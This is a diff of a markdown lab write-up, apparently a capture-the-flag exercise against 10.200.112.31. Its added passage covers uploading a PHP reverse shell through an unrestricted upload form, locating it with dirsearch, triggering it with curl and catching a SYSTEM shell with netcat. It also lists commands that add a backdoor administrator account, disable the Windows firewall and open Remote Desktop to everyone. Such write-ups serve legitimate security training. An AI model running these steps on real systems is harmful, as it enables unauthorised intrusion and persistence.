@@ -395,18 +395,18 @@ Host script results:
 |_  start_date: N/A
 ```
 - Navigating to the web portal on 10.200.112.31.
-> If failing to navigate make sure to edit proxy in browser.
+> If failing to navigate make sure to edit the proxy in the browser.
 - Alternatively, run cmd `google-chrome-stable --proxy-server="socks5://127.0.0.1:1080"`
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/996a283e-421e-4695-a231-31a98cbe7e14)
 
-- Remember that we have fetched Data from MySQL server that has user Gurag.
-- click on reset the pasword for user gurag.
+- Remember that we have fetched Data from a MySQL server that has user Gurag.
+- click on reset the password for user gurag.
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/6a9ce496-332d-4018-bf99-fcbb9c77409d)
 
-- We found vulnerability as the token is stored locally in browser.
-- Upon opening the developer tools and under Appplications > Storage > Cookies section in Chrome we found the token.
+- We found a vulnerability as the token is stored locally in the browser.
+- Upon opening the developer tools and under the Applications > Storage > Cookies section in Chrome we found the token.
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/593582a0-eddf-4b88-88df-9675518a6a46)
 
@@ -414,3 +414,34 @@ Host script results:
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/d05cfd45-6024-4543-99bf-8638f06d7f25)
 
+- On checking the `upload.js` file I found no any restriction on file uploads.
+- So, I utilize upload php rev shell.
+
+- Next step is to look for the location where the file is been uploaded. I did Dirsearch.
+```bash
+└─$ sudo proxychains ./dirsearch.py -u http://10.200.112.31 -w /usr/share/wordlists/dirb/common.txt 
+[23:38:15] 301 -  340B  - /images  ->  http://10.200.112.31/images/         
+[23:38:15] 301 -  340B  - /Images  ->  http://10.200.112.31/Images/
+[23:38:15] 301 -  337B  - /img  ->  http://10.200.112.31/img/
+```
+- I set up a listener on my machine.
+- Next, I fetch the shell.php file using curl cmd from the terminal.
+```bash
+└─$ proxychains curl http://10.200.112.31/images/shell.php
+```
+- Got shell:
+```bash
+└─$ rlwrap nc -nvlp 1234
+
+C:\web\htdocs\images>whoami
+nt authority\system
+```
+- We will find the root flag under the desktop.
+- I tried to dump sam file but I don't have access to this.
+- I used the below commands further.
+```bash
+net user boss boss123 /add
+net localgroup administrators boss /add
+netsh advfirewall set allprofiles state off
+net localgroup "Remote Desktop Users" Everyone /Add
+```
